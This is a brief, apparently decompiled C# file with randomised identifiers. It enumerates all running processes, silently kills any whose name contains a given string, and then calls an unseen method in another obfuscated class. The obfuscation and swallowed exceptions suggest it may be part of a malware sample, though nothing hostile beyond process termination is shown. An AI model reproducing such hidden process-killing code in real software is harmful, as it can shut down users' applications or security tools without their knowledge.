using System;
using System.Diagnostics;

namespace bfaErnBXmrcm;

public sealed class pGTJrmoXUcDmVV
{
	public static bool yaSTekbqqHPK(Process process_0, string string_0)
	{
		try
		{
			return process_0.ProcessName.ToLower().Contains(string_0.ToLower());
		}
		catch (InvalidOperationException)
		{
			return false;
		}
		catch (NullReferenceException)
		{
			return false;
		}
		catch
		{
			return false;
		}
	}

	public static void HhHvPOjcxdjpSEYg(string string_0, string string_1)
	{
		Process[] processes = Process.GetProcesses();
		foreach (Process process in processes)
		{
			if (yaSTekbqqHPK(process, string_0.ToLower()))
			{
				try
				{
					process.Kill();
					process.WaitForExit();
					XPQlliQqqoVcs.dKhnUXdSsUQkr();
				}
				catch (InvalidOperationException)
				{
				}
				catch (PlatformNotSupportedException)
				{
					break;
				}
				catch
				{
				}
			}
		}
	}
}
